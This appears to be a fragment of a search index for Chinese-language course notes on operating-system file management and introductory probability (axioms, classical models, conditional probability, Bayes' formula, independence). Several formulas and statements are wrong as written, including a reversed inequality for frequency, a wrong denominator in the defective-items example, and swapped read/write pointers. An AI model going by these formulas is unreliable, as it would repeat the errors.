entry\uff0c\u8bb0\u5f55\u4e86\u5305\u542b\u65b0\u6587\u4ef6\u540d\u3001\u5728\u5916\u5b58\u4e2d\u7684\u5730\u5740\u7b49\u4fe1\u606f</li> </ol> </li> </ul> </li> <li>Delete<ul> <li>\u6839\u636e\u6587\u4ef6\u540d\u67e5\u627e\u76ee\u5f55\uff0c\u5220\u9664\u5bf9\u5e94 D entry \u548c FCB\uff0c\u7136\u540e\u56de\u6536\u5360\u7528\u7684\u5b58\u50a8\u7a7a\u95f4</li> </ul> </li> <li>Write - define a pointer<ul> <li>\u6839\u636e\u6587\u4ef6\u540d\u67e5\u627e\u76ee\u5f55\uff0c\u627e\u5230 D entry \u540e\u5f97\u5230\u5176\u5728\u5916\u5b58\u4e2d\u7684\u5730\u5740</li> <li>D entry \u4e2d\u8fd8\u5b9a\u4e49\u4e86\u4e00\u4e2a\u8bfb\u6307\u9488</li> </ul> </li> <li>Read - use the same pointer<ul> <li>\u6839\u636e\u6587\u4ef6\u540d\u67e5\u627e\u76ee\u5f55\uff0c\u627e\u5230 D entry \u540e\u5229\u7528\u5199\u6307\u9488\u8fdb\u884c\u5199\u64cd\u4f5c</li> </ul> </li> </ul> <p>\u5f53\u7528\u6237\u5bf9\u4e00\u4e2a\u6587\u4ef6\u8fdb\u884c\u591a\u6b21\u8bfb/\u5199\u65f6\uff0c\u6bcf\u6b21\u90fd\u8981\u91cd\u65b0\u68c0\u7d22\u76ee\u5f55\u3002\u4e3a\u4e86\u907f\u514d\u91cd\u590d\uff0c\u5927\u591a\u6570\u64cd\u4f5c\u7cfb\u7edf\u90fd\u8981\u6c42\u7528\u6237\u4f7f\u7528\u7cfb\u7edf\u8c03\u7528 <code>open</code> \u5c06\u6587\u4ef6\u6253\u5f00\u518d\u8fdb\u884c\u8bfb\u5199\u64cd\u4f5c\uff0c\u4f7f\u7528\u7cfb\u7edf\u8c03\u7528 <code>close</code> \u5173\u95ed\u3002</p> <p>\u7cfb\u7edf\u4f1a\u4e3a\u6253\u5f00\u7684\u6587\u4ef6\u7ef4\u62a4\u4e00\u4e2a Open-File Table\uff0c\u6240\u8c13\u6253\u5f00\u5c31\u662f\u7cfb\u7edf\u5728\u68c0\u7d22\u5230\u6307\u5b9a\u6587\u4ef6\u7684 D entry \u540e\uff0c\u5c06\u8be5\u76ee\u5f55\u9879\u4ece\u5916\u5b58\u590d\u5236\u5230\u5185\u5b58\u7684 Open-File Table \u4e2d\uff0c\u5e76\u5c06\u8be5\u8868\u9879\u7684\u6587\u4ef6\u63cf\u8ff0\u7b26\u8fd4\u56de\u7ed9\u7528\u6237\u3002\u5f53\u7528\u6237\u518d\u6b21\u5bf9\u8be5\u6587\u4ef6\u53d1\u51fa\u64cd\u4f5c\u8bf7\u6c42\u65f6\uff0c\u53ef\u901a\u8fc7\u6587\u4ef6\u63cf\u8ff0\u7b26\u5728\u8868\u4e2d\u67e5\u627e\u5230\u6587\u4ef6\u4fe1\u606f\uff0c\u4ece\u800c\u8282\u7701\u68c0\u7d22\u5f00\u9500\u3002</p> \u5bf9\u4e8e\u591a\u8fdb\u7a0b\u7cfb\u7edf\uff0c\u901a\u5e38\u91c7\u7528\u8fdb\u7a0b\u8868\u548c\u7cfb\u7edf\u8868\u4e24\u7ea7 <ul> <li>System-wide Table \u5305\u542b\u4e0e\u8fdb\u7a0b\u65e0\u5173\u7684\u4fe1\u606f\uff0c\u5982 Location\uff0cTime\uff0cSize</li> <li>Per-process Table \u5305\u542b\u8fdb\u7a0b\u5bf9\u6587\u4ef6\u7684\u4f7f\u7528\u4fe1\u606f\uff0c\u5982\u8bfb/\u5199\u6307\u9488\uff0cAccess Rights\uff0c\u4ee5\u53ca\u6307\u5411\u7cfb\u7edf\u8868\u4e2d\u5bf9\u5e94\u6761\u76ee\u7684\u6307\u9488</li> <li>\u5f53\u4e00\u4e2a\u8fdb\u7a0b\u6267\u884c <code>open</code> \u65f6\uff0c\u4f1a\u4e3a\u5176\u8fdb\u7a0b\u8868\u4e2d\u589e\u52a0\u4e00\u4e2a\u6761\u76ee\uff0c\u5e76\u6307\u5411\u7cfb\u7edf\u8868\u4e2d\u5bf9\u5e94\u8be5\u6587\u4ef6\u7684\u6761\u76ee</li> <li>\u7cfb\u7edf\u8868\u4f1a\u4e3a\u6bcf\u4e2a\u6587\u4ef6\u7ef4\u62a4\u4e00\u4e2a Open Count\uff0c\u4ee5\u8bb0\u5f55\u591a\u5c11\u8fdb\u7a0b\u6253\u5f00\u4e86\u8be5\u6587\u4ef6\uff1b\u5f53 Open Count \u4e3a 0 \u65f6\uff0c\u5373\u53ef\u4ece\u7cfb\u7edf\u8868\u4e2d\u5220\u9664\u8be5\u6761\u76ee</li> </ul> <p></p> <p>\u6587\u4ef6\u540d\u53ea\u6709\u4e00\u5f00\u59cb\u68c0\u7d22\u6709\u7528\uff0c\u4e4b\u540e\u7528\u7684\u90fd\u662f\u6587\u4ef6\u63cf\u8ff0\u7b26\u6765\u8bbf\u95ee Open-File Table \u4e2d\u7684\u8868\u9879</p>"},{"location":"Courses/OS/Topic5/#directory","title":"Directory","text":"<p>\u4e3a\u4e86\u4fbf\u4e8e\u6587\u4ef6\u7ba1\u7406\uff0c\u6211\u4eec\u5f15\u5165 File Control Block \u5b58\u653e\u63a7\u5236\u6587\u4ef6\u6240\u9700\u7684\u5404\u79cd\u4fe1\u606f\u3002\u6587\u4ef6\u4e00\u4e00\u4e0e FCB \u5bf9\u5e94\uff0cFCB \u7684\u6709\u5e8f\u7ed3\u5408\u79f0\u4e3a Directory\uff0c\u800c\u4e00\u4e2a FCB \u5c31\u662f\u4e00\u4e2a D entry\u3002</p> <p>\u901a\u5e38\u6211\u4eec\u4e5f\u5c06\u4e00\u4e2a Directory \u89c6\u4e3a\u6587\u4ef6\uff0c\u5373\u76ee\u5f55\u6587\u4ef6</p> <p>FCB \u4e3b\u8981\u5305\u542b\u4ee5\u4e0b\u4fe1\u606f\uff1a</p> <ul> <li>\u57fa\u672c\u4fe1\u606f: \u6587\u4ef6\u540d\u3001\u6587\u4ef6\u7269\u7406\u4f4d\u7f6e\u3001\u6587\u4ef6\u7269\u7406\u7ed3\u6784\u3001\u6587\u4ef6\u903b\u8f91\u7ed3\u6784\u7b49</li> <li>\u5b58\u53d6\u63a7\u5236\u4fe1\u606f: \u5404\u7c7b\u7528\u6237\u7684\u5b58\u53d6\u6743\u9650</li> <li>\u4f7f\u7528\u4fe1\u606f: \u6587\u4ef6\u5efa\u7acb\u65f6\u95f4\u3001\u4e0a\u6b21\u4fee\u6539\u65f6\u95f4\u7b49</li> </ul> <p>\u63a5\u4e0b\u6765\u6211\u4eec\u7531\u6d45\u5165\u6df1\u8003\u8651\u76ee\u5f55\u7ed3\u6784\u7684\u9009\u62e9\u3002</p> <p>Single-Level Directory</p> <p>\u6574\u4e2a\u6587\u4ef6\u7cfb\u7edf\u53ea\u5efa\u7acb\u4e00\u5f20\u76ee\u5f55\u8868\uff0c\u6bcf\u4e2a\u6587\u4ef6\u5360\u7528\u4e00\u4e2a\u76ee\u5f55\u9879\uff1a</p> <p></p> <p>\u5f53\u5efa\u7acb\u65b0\u6587\u4ef6\u65f6\uff0c\u5fc5\u987b\u68c0\u7d22\u6240\u6709\u76ee\u5f55\u9879\uff0c\u4ee5\u786e\u4fdd\u6ca1\u6709\u201c\u91cd\u540d\u201d\u7684\u60c5\u51b5\uff0c\u56e0\u6b64\u5355\u7ea7\u76ee\u5f55\u7ed3\u6784\u5b58\u5728\u67e5\u627e\u901f\u5ea6\u6162\u3001\u6587\u4ef6\u4e0d\u5141\u8bb8\u91cd\u540d\u3001\u4e0d\u4fbf\u4e8e\u6587\u4ef6\u5171\u4eab\u7b49\u7f3a\u70b9\u3002</p> <p>Two-Level Directory</p> <p>\u4e3a\u4e86\u9002\u914d\u591a\u7528\u6237\u7684\u64cd\u4f5c\u7cfb\u7edf\uff0c\u6211\u4eec\u5c06 Directory \u5206\u4e3a Master File Directory \u548c User File Directory \u4e24\u7ea7\uff1a</p> <p></p> <p>\u5176\u4e2d\uff0c\u4e3b\u6587\u4ef6\u76ee\u5f55\u8bb0\u5f55\u4e86 <code>&lt;\u7528\u6237\u540d, UFD \u5730\u5740&gt;</code>\uff0c\u7528\u6237\u6587\u4ef6\u76ee\u5f55\u8bb0\u5f55\u4e86\u8be5\u7528\u6237\u6240\u6709\u6587\u4ef6\u7684 FCB\u3002</p> <p>\u4e24\u7ea7\u76ee\u5f55\u63d0\u9ad8\u4e86\u68c0\u7d22\u7684\u901f\u5ea6\uff0c\u89e3\u51b3\u4e86\u591a\u7528\u6237\u4e4b\u95f4\u7684\u6587\u4ef6\u91cd\u540d\u95ee\u9898\uff0c\u4f46\u662f\u7f3a\u4e4f\u7075\u6d3b\u6027\u3002</p> <p>Tree-Structured Directory</p> <p>\u5f53\u7528\u6237\u8981\u8bbf\u95ee\u67d0\u4e2a\u6587\u4ef6\u65f6\uff0c\u7528\u6587\u4ef6\u7684\u8def\u5f84\u540d\u8868\u793a\u6587\u4ef6\u3002\u6bcf\u4e2a\u7528\u6237\u90fd\u6709\u5404\u81ea\u7684\u5f53\u524d\u76ee\u5f55\uff0c\u767b\u5f55\u540e\u81ea\u52a8\u8fdb\u5165\u8be5\u7528\u6237\u7684\u5f53\u524d\u76ee\u5f55\u3002</p> <p></p> <p>\u6811\u5f62\u76ee\u5f55\u7ed3\u6784\u53ef\u4ee5\u5f88\u65b9\u4fbf\u5730\u5bf9\u6587\u4ef6\u8fdb\u884c\u5206\u7c7b\uff0c\u5c42\u6b21\u7ed3\u6784\u6e05\u6670\uff0c\u5bf9\u6587\u4ef6\u7684\u7ba1\u7406\u548c\u4fdd\u62a4\u66f4\u6709\u6548\u3002</p> <p>\u4f46\u662f\uff0c\u5728\u6811\u5f62\u76ee\u5f55\u4e2d\u67e5\u627e\u4e00\u4e2a\u6587\u4ef6\uff0c\u9700\u8981\u6309\u8def\u5f84\u9010\u7ea7\u8bbf\u95ee\u4e2d\u95f4\u8282\u70b9\uff0c\u4e5f\u4f1a\u5f71\u54cd\u67e5\u8be2\u901f\u5ea6\u3002\u76ee\u524d\u5927\u591a\u6570\u64cd\u4f5c\u7cfb\u7edf\u90fd\u91c7\u7528\u4e86\u8be5\u7ed3\u6784\u3002</p> <p>Acyclic-Graph Directory</p> <p>\u6811\u5f62\u76ee\u5f55\u7ed3\u6784\u867d\u7136\u5b9e\u73b0\u4e86\u6587\u4ef6\u5206\u7c7b\uff0c\u4f46\u4e0d\u4fbf\u4e8e\u5b9e\u73b0\u6587\u4ef6\u5171\u4eab\u3002\u4e3a\u6b64\uff0c\u6211\u4eec\u5728\u6811\u5f62\u57fa\u7840\u4e0a\u589e\u52a0\u4e86\u4e00\u4e9b\u6307\u5411\u540c\u4e00\u8282\u70b9\u7684\u6709\u5411\u8fb9\uff0c\u4f7f\u5f97\u6574\u4e2a\u76ee\u5f55\u6210\u4e3a\u4e00\u4e2a\u6709\u5411\u65e0\u73af\u56fe\u3002\u8fd9\u79cd\u7ed3\u6784\u5141\u8bb8\u76ee\u5f55\u5171\u4eab\u5b50\u76ee\u5f55\u6216\u6587\u4ef6\uff0c\u540c\u4e00\u6587\u4ef6\u6216\u5b50\u76ee\u5f55\u53ef\u4ee5\u51fa\u73b0\u5728\u4e24\u4e2a\u6216\u591a\u4e2a\u76ee\u5f55\u4e2d\uff1a</p> <p></p> <p>\u5f53\u7136\uff0c\u9700\u8981\u4e3a\u5171\u4eab\u8282\u70b9\u8bbe\u7f6e\u4e00\u4e2a Count\uff0c\u53ea\u6709\u8ba1\u6570\u5668\u4e3a 0 \u65f6\u624d\u771f\u6b63\u5220\u9664\u8be5\u8282\u70b9</p>"},{"location":"Courses/OS/Topic5/#file-system_1","title":"File System","text":""},{"location":"Courses/PS/","title":"\u6982\u7387\u8bba\u4e0e\u6570\u7406\u7edf\u8ba1","text":""},{"location":"Courses/PS/#_1","title":"\u6982\u7387\u8bba\u4e0e\u6570\u7406\u7edf\u8ba1","text":"<p> \u7ea6 296 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 1 \u5206\u949f</p>"},{"location":"Courses/PS/#_2","title":"\u5206\u6570\u6784\u6210","text":"<ul> <li>\u8bfe\u540e\u4f5c\u4e1a + \u5230\u8bfe\u7387 25%</li> <li>\u5b66\u5728\u6d59\u5927 5 \u4e2a\u8ba8\u8bba\u9898 5%</li> <li>\u4e09\u6b21\u7ebf\u4e0a\u6d4b\u9a8c 30%<ul> <li>\u6d4b\u9a8c\u4e00 \u5185\u5bb9\u5230\u7b2c\u4e8c\u7ae0</li> <li>\u6d4b\u9a8c\u4e8c \u5185\u5bb9\u5230\u7b2c\u56db\u7ae0</li> <li>\u6d4b\u9a8c\u4e09 \u5185\u5bb9\u5230\u7b2c\u4e03\u7ae0</li> </ul> </li> <li>\u671f\u672b\u8003\u8bd5 40%</li> </ul> <p>\u7ebf\u4e0a\u6d4b\u9a8c\u53d6\u4e24\u6b21\u6700\u9ad8\u6210\u7ee9</p>"},{"location":"Courses/PS/#_3","title":"\u6559\u5b66\u5185\u5bb9","text":"<p>\u7b2c\u4e8c\u7ae0\u4e0d\u8003 2.4\uff08\u56db\uff09\u5176\u5b83\u8fde\u7eed\u578b\u968f\u673a\u53d8\u91cf</p> <p>\u7b2c\u56db\u7ae0\u4e0d\u8003\u6761\u4ef6\u6570\u5b66\u671f\u671b\u3001\u534f\u65b9\u5dee\u77e9\u9635</p> <p>\u7b2c\u4e94\u7ae0\u4e0d\u8003\u9a6c\u5c14\u53ef\u592b\u4e0d\u7b49\u5f0f\u3001\u674e\u96c5\u666e\u8bfa\u592b\u4e2d\u5fc3\u6781\u9650\u5b9a\u7406</p> <p>\u7b2c\u516d\u7ae0\u4e0d\u8003\u9644\u5f55</p> <p>\u7b2c\u4e03\u7ae0\u4e0d\u8003\u4e24\u4e2a\u6b63\u6001\u603b\u4f53\u65b9\u5dee\u4e0d\u7b49\u672a\u77e5\u7684\u5747\u503c\u5dee\u533a\u95f4\u4f30\u8ba1\u3001\u975e\u6b63\u6001\u603b\u4f53\u53c2\u6570\u533a\u95f4\u4f30\u8ba1</p> <p>\u7b2c\u516b\u7ae0\u4e0d\u8003\u4e24\u4e2a\u6b63\u6001\u65b9\u5dee\u4e0d\u7b49\u672a\u77e5\u7684\u5747\u503c\u662f\u5426\u76f8\u7b49\u5047\u8bbe\u68c0\u9a8c\u30018.6\u8282\u5217\u8054\u8868\u7684\u72ec\u7acb\u6027\u68c0\u9a8c</p> <p>\u6559\u5b66\u5185\u5bb9\u548c\u8003\u8bd5\u8303\u56f4\u6bcf\u5e74\u4f3c\u4e4e\u90fd\u4e0d\u4e00\u6837</p>"},{"location":"Courses/PS/#_4","title":"\u603b\u7ed3","text":"<p>\u671f\u672b\u8003\u8bd5\u9898\u76ee\u5f88\u5c11\uff0c\u6240\u4ee5\u6162\u6162\u7b97\u6ca1\u5173\u7cfb\uff0c\u96be\u5ea6\u4e5f\u4e0d\u7b97\u5f88\u96be\u3002</p> <p>\u5176\u5b9e\u540e\u9762\u7684\u51e0\u7ae0\u591a\u505a\u70b9\u9898\u5c31\u80fd\u4e86\u89e3\u5230\u89c4\u5f8b\u4e86\uff0c\u719f\u7ec3\u8d77\u6765\u53ea\u662f\u5355\u7eaf\u5957\u5165\u516c\u5f0f\u5c31\u884c\u3002</p>"},{"location":"Courses/PS/CH1/","title":"\u6982\u7387\u8bba\u7684\u57fa\u672c\u6982\u5ff5","text":""},{"location":"Courses/PS/CH1/#_1","title":"\u6982\u7387\u8bba\u7684\u57fa\u672c\u6982\u5ff5","text":"<p> \u7ea6 1156 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 6 \u5206\u949f</p>"},{"location":"Courses/PS/CH1/#_2","title":"\u6837\u672c\u7a7a\u95f4\u3001\u968f\u673a\u4e8b\u4ef6","text":"<p>\u5bf9\u968f\u673a\u73b0\u8c61\u8fdb\u884c\u89c2\u5bdf\u3001\u8bb0\u5f55\u3001\u8bd5\u9a8c\uff0c\u79f0\u4e3a\u968f\u673a\u8bd5\u9a8c (random experiment)\uff0c\u5176\u5177\u6709\u4ee5\u4e0b\u4e09\u4e2a\u7279\u70b9\uff1a</p> <p>(1) \u53ef\u4ee5\u5728\u76f8\u540c\u6761\u4ef6\u4e0b\u91cd\u590d\u8fdb\u884c</p> <p>(2) \u6bcf\u6b21\u8bd5\u9a8c\u53ef\u80fd\u51fa\u73b0\u7684\u7ed3\u679c\u662f\u4e0d\u786e\u5b9a\u7684\uff0c\u4f46\u80fd\u4e8b\u5148\u77e5\u9053\u8bd5\u9a8c\u7684\u6240\u6709\u53ef\u80fd\u7ed3\u679c</p> <p>(3) \u6bcf\u6b21\u8bd5\u9a8c\u5b8c\u6210\u524d\u4e0d\u80fd\u9884\u77e5\u53d1\u751f\u54ea\u4e2a\u7ed3\u679c</p> <p>\u6240\u6709\u53ef\u80fd\u7ed3\u679c\u53ef\u4ee5\u6709\u65e0\u9650\u4e2a\uff0c\u4f46\u9700\u8981\u53ef\u5217 (\u4e0e \\(N\\) \u7b49\u52bf)</p> <ul> <li>\u968f\u673a\u8bd5\u9a8c\u6240\u6709\u53ef\u80fd\u7ed3\u679c\u6784\u6210\u7684\u96c6\u5408\u5c31\u662f \u6837\u672c\u7a7a\u95f4 (sample space) \uff0c\u5e38\u7528\u5b57\u6bcd \\(S\\) \u6216 \\(\\Omega\\) \u8868\u793a</li> <li>\u6837\u672c\u7a7a\u95f4 \\(S\\) \u4e2d\u7684\u6bcf\u4e00\u4e2a\u5143\u7d20\uff0c\u5373\u8bd5\u9a8c\u7684\u6bcf\u4e00\u4e2a\u7ed3\u679c\u79f0\u4e3a \u6837\u672c\u70b9 (sample point)</li> <li>\u6837\u672c\u7a7a\u95f4\u7684\u4efb\u4e00\u5b50\u96c6\u79f0\u4e3a \u968f\u673a\u4e8b\u4ef6 (random event) \uff0c\u7b80\u79f0\u4e8b\u4ef6\uff0c\u5e38\u7528\u5b57\u6bcd \\(A\\),\\(B\\),\\(C\\) \u7b49\u8868\u793a\uff0c\u6216\u7528\u6587\u5b57\u52a0\u5927\u62ec\u53f7\u660e\u786e\u5176\u542b\u4e49<ul> <li>\u7279\u522b\u5730\uff0c\u53ea\u542b\u6709\u4e00\u4e2a\u6837\u672c\u70b9\u7684\u4e8b\u4ef6\u79f0\u4e3a \u57fa\u672c\u4e8b\u4ef6 (elementary event)</li> </ul> </li> </ul> <p>\u901a\u8fc7\u4ee5\u4e0a\u5b9a\u4e49\uff0c\u53ef\u4ee5\u53d1\u73b0\u968f\u673a\u4e8b\u4ef6\u7684\u76f8\u4e92\u5173\u7cfb\u53ca\u8fd0\u7b97\u4e0e\u96c6\u5408\u7c7b\u4f3c\uff0c\u4e14\u53ef\u4ee5\u7528\u7ef4\u6069\u56fe (Venn) \u6765\u8868\u793a\uff1a</p> <p></p> <p>\u7531\u4e8e\u96c6\u5408\u7684\u8fd0\u7b97\u57fa\u672c\u4eba\u5c3d\u7686\u77e5\uff0c\u6b64\u5904\u4e0d\u518d\u8d39\u65f6\u5217\u51fa</p>"},{"location":"Courses/PS/CH1/#_3","title":"\u9891\u7387\u4e0e\u6982\u7387","text":"<p>\u5728\u76f8\u540c\u6761\u4ef6\u4e0b\u8fdb\u884c \\(n\\)(\\(n\\ge 1\\)) \u6b21\u91cd\u590d\u5b9e\u9a8c\uff0c\u8bb0\u4e8b\u4ef6 \\(A\\) \u53d1\u751f \\(n_A\\) \u6b21\uff0c\u5219\u79f0\u6bd4\u503c \\(\\frac{n_A}{n}\\) \u4e3a\u4e8b\u4ef6 \\(A\\) \u5728\u8fd9 \\(n\\) \u6b21\u8bd5\u9a8c\u4e2d\u53d1\u751f\u7684\u9891\u7387 (frequency) \uff0c\u8bb0\u4e3a \\(f_n(A)\\)</p> <p>\u79f0 \\(n_A\\) \u4e3a \\(A\\) \u5728\u8fd9 \\(n\\) \u6b21\u8bd5\u9a8c\u53d1\u751f\u7684\u9891\u6570</p> <p>\u7531\u4e8b\u4ef6\u9891\u7387\u7684\u5b9a\u4e49\uff0c\u6613\u77e5\u5176\u5177\u6709\u4ee5\u4e0b\u6027\u8d28\uff1a</p> <p>(1) \u5bf9\u4efb\u4e00\u4e8b\u4ef6 \\(A\\) \uff0c\\(0\\ge f_n(A) \\ge 1\\)</p> <p>(2) \\(f_n(S) = 1\\)</p> <p>(3) \u82e5\u4e8b\u4ef6 \\(A\\) \u4e0e \\(B\\) \u4e92\u4e0d\u76f8\u5bb9\uff0c\u5373 \\(A\\cap B = \\emptyset\\) \uff0c\u5219 \\(f_n(A\\cup B) =f_n(A) +f_n(B)\\) </p> <p>\u5f53\u603b\u8bd5\u9a8c\u6b21\u6570 \\(n\\) \u5145\u5206\u5927\u65f6\uff0c\\(A\\) \u7684\u9891\u7387 \\(f_n(A)\\) \u7684\u7a33\u5b9a\u503c \\(p\\) \u5b9a\u4e49\u4e3a\u4e8b\u4ef6 \\(A\\) \u7684\u6982\u7387\uff0c\u8bb0\u4e3a \\(P(A) = p\\) \uff0c\u8fd9\u662f\u6982\u7387\u7684\u7edf\u8ba1\u6027\u5b9a\u4e49</p> <p>\u7edf\u8ba1\u6027\u5b9a\u4e49\u5728\u5b9e\u8df5\u4e2d\u96be\u4ee5\u8fbe\u5230\u7edf\u4e00\uff0c\u4e14\u5728\u6570\u5b66\u4e0a\u4e0d\u591f\u4e25\u8c28\uff0c\u56e0\u6b64\u6709\u4e86\u5982\u4e0b\u6982\u7387\u7684\u516c\u7406\u6027\u5b9a\u4e49\uff1a</p> <p>(1) \u975e\u8d1f\u6027: \\(P(A)\\ge 0\\)</p> <p>(2) \u89c4\u8303\u6027: \\(P(S)=1\\)</p> <p>(3) \u53ef\u5217\u53ef\u52a0\u6027: \u5bf9\u53ef\u5217\u4e2a\u4e24\u4e24\u4e92\u4e0d\u76f8\u5bb9\u7684\u4e8b\u4ef6 \\(A_1, A_2, A_3,..., A_n,...\\) \uff0c\u6709\uff1a</p> \\[ P(\\bigcup ^n _{j=1} A_j) = \\sum ^{+\\infty} _{j=1} P(A_j) \\] <p>\u6ee1\u8db3\u4ee5\u4e0a\u4e09\u6761\u516c\u7406\uff0c\u5219\u79f0 \\(P(A)\\) \u4e3a\u4e8b\u4ef6 \\(A\\) \u53d1\u751f\u7684\u6982\u7387</p> <p>\u540c\u6837\u4e0e\u96c6\u5408\u7c7b\u4f3c\uff0c\u6982\u7387\u7684\u52a0\u6cd5\u516c\u5f0f\u5982\u4e0b\uff1a</p> \\[ P(\\bigcup ^n _{j=1} A_j) = \\sum ^n _{j=1} P(A_j) - \\sum_{i\\lt j} P(A_i A_j) +\\sum _{i\\lt j\\lt k} P(A_i A_j A_k) -...+(-1)^{n-1} P(A_1 A_2 ...A_n) \\]"},{"location":"Courses/PS/CH1/#_4","title":"\u53e4\u5178\u6982\u578b","text":"<p>\u53e4\u5178\u6982\u578b\uff0c\u5373\u7b49\u53ef\u80fd\u6982\u578b\uff0c\u6ee1\u8db3\u4ee5\u4e0b\u4e24\u4e2a\u6761\u4ef6\uff1a</p> <ul> <li>\u6709\u9650\u6027 \uff1aS \u4e2d\u6837\u672c\u70b9\u6709\u9650</li> <li>\u7b49\u53ef\u80fd\u6027 \uff1a\u51fa\u73b0\u6bcf\u4e00\u6837\u672c\u70b9\u7684\u6982\u7387\u76f8\u7b49</li> </ul> <p>\u4f8b 1 \uff1a \u6709 N \u4ef6\u4ea7\u54c1\uff0c\u5176\u4e2d D \u4ef6\u662f\u6b21\u54c1\uff0c\u4ece\u4e2d\u4e0d\u653e\u56de\u7684\u53d6 n \u4ef6\uff0c \u8bb0 \\(A_k :\uff1d {\u6070\u6709k\u4ef6\u6b21\u54c1}\\)\uff0c\\(k\\le D\\) \uff0c \u6c42 \\(P(A_k)\\) :</p> \\[ P(A_k) =\\frac{C^k_D C^{n-k}_{N-D}}{C ^n_D} \\] <p>\u4f8b 2 \uff1a \u751f\u65e5\u95ee\u9898\uff0cn \u4e2a\u4eba\u4e2d\uff0c\u81f3\u5c11\u4e24\u4e2a\u4eba\u751f\u65e5\u76f8\u540c\u7684\u6982\u7387\u4e3a\uff1f</p> \\[ P=1-\\frac{A^n_{365}}{ 365^n} \\] <p>\u4ece\u516b\u4eba\u4e2d\u968f\u673a\u9009\u4e00\u4eba\uff0c\u600e\u4e48\u9009\uff1f</p> <p>\u4e00\u679a\u786c\u5e01\u6295\u4e09\u6b21\uff0c\u4e8c\u8fdb\u5236\u6570\u662f\u51e0\u5c31\u662f\u54ea\u4e2a\u4eba</p>"},{"location":"Courses/PS/CH1/#_5","title":"\u6761\u4ef6\u6982\u7387\u4e0e\u5168\u6982\u7387\u516c\u5f0f","text":"<p>\u6761\u4ef6\u6982\u7387\u516c\u5f0f\u5982\u4e0b\uff1a</p> \\[ P(B|A)=\\frac{P(AB)}{P(A)}\\ ,\\ P(A)\\ne 0 \\] <p>\u6761\u4ef6\u6982\u7387\u5177\u6709\u6982\u7387\u7684\u6240\u6709\u6027\u8d28\uff0c\u5373\u975e\u8d1f\u6027\u3001\u89c4\u8303\u6027\u3001\u53ef\u5217\u53ef\u52a0\u6027</p> <p>\u6761\u4ef6\u6982\u7387\u7684\u4e58\u6cd5\u516c\u5f0f\u5982\u4e0b\uff1a</p> \\[ P(A_1 A_2 ...A_n)=P(A_1)P (A_2 |A_1) P(A_3|A _1A _2)... P(A_n |A_1 A_2 ...A_{n-1}) \\] <p>\u5168\u6982\u7387\u516c\u5f0f\u5982\u4e0b\uff1a</p> \\[ P(A)=\\sum ^n_{j=1} P(B_j)\\cdot P(A|B_j) \\] <p>\u5176\u4e2d\uff0c\\(B_1, B_2, ...,B_n\\) \u4e3a\u6837\u672c\u7a7a\u95f4\u7684\u5212\u5206</p> <p>\u8fd0\u7528\u597d\u5168\u6982\u7387\u516c\u5f0f\uff0c\u5173\u952e\u5728\u4e8e\u6784\u9020\u4e00\u7ec4\u5408\u9002\u7684\u5212\u5206</p> <p>\u6839\u636e\u5168\u6982\u7387\u516c\u5f0f\uff0c\u53c8\u53ef\u4ee5\u5f97\u5230\u8d1d\u53f6\u65af\u516c\u5f0f\uff1a</p> \\[ P(B_i |A) =\\frac{P(B_i)\\cdot P(A|B_i)}{\\sum ^n_{j=1} P(B_j)\\cdot P(A|B_j)} \\]"},{"location":"Courses/PS/CH1/#_6","title":"\u72ec\u7acb\u6027","text":"<p>\u8bbe \\(A\\),\\(B\\) \u4e3a\u4e24\u4e2a\u968f\u673a\u4e8b\u4ef6\uff0c\u5982\u679c\u6ee1\u8db3 \\(P(AB)=P(A)P(B)\\) \uff0c\u5219\u79f0 \\(A,B\\) \u76f8\u4e92\u72ec\u7acb\uff0c\u4e14\u6709\uff1a</p> \\[ A,B \u76f8\u4e92\u72ec\u7acb \\Leftrightarrow \\bar{A}B \u76f8\u4e92\u72ec\u7acb \\Leftrightarrow A\\bar{B} \u76f8\u4e92\u72ec\u7acb \\Leftrightarrow \\bar{A}\\bar{B} \u76f8\u4e92\u72ec\u7acb  \\] <p>\u8bbe \\(A_1, A_2,..., A_n\\) \u4e3a n \u4e2a\u968f\u673a\u4e8b\u4ef6\uff0c\u82e5\u5bf9 \\(2\\le k\\le n\\) \uff0c\u5747\u6709\uff1a</p> \\[ P(A_{i _1} A_{ i_2} ...A_{i _k}) =\\Pi ^k_{j=1} P(A_{i _j}) \\] <p>\u5219\u79f0 \\(A_1, A_2,..., A_n\\) \u76f8\u4e92\u72ec\u7acb</p> <p>\u4e24\u4e24\u72ec\u7acb\u4e0d\u80fd\u63a8\u51fa\u76f8\u4e92\u72ec\u7acb</p>"},{"location":"Courses/PS/CH2/","title":"\u968f\u673a\u53d8\u91cf\u53ca\u5176\u5206\u5e03","text":""},{"location":"Courses/PS/CH2/#_1","title":"\u968f\u673a\u53d8\u91cf\u53ca\u5176\u5206\u5e03","text":"<p> \u7ea6 1847 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 9 \u5206\u949f</p>"},{"location":"Courses/PS/CH2/#_2","title":"\u968f\u673a\u53d8\u91cf","text":"<p>\u8bbe\u968f\u673a\u8bd5\u9a8c\u7684\u6837\u672c\u7a7a\u95f4\u4e3a \\(S={e}\\) \uff0c\u82e5 \\(X=X(e)\\) \u4e3a\u5b9a\u4e49\u5728\u6837\u672c\u7a7a\u95f4 \\(S\\) \u4e0a\u7684\u5b9e\u503c\u5355\u503c\u51fd\u6570\uff0c\u5219\u79f0 \\(X=X(e)\\) \u4e3a\u968f\u673a\u53d8\u91cf\u3002</p> <p>\u5b9e\u503c\u5355\u503c\u51fd\u6570</p> <p>\u6307\u81ea\u53d8\u91cfx\u548c\u51fd\u6570y\u90fd\u5728\u5b9e\u6570\u8303\u56f4\u5185\u53d6\u503c\uff0c\u4e14\u5bf9\u4e8e\u6bcf\u4e2ax\uff0c\u5747\u6709\u552f\u4e00\u786e\u5b9a\u7684y\u548c\u5b83\u5bf9\u5e94\u7684\u51fd\u6570</p> 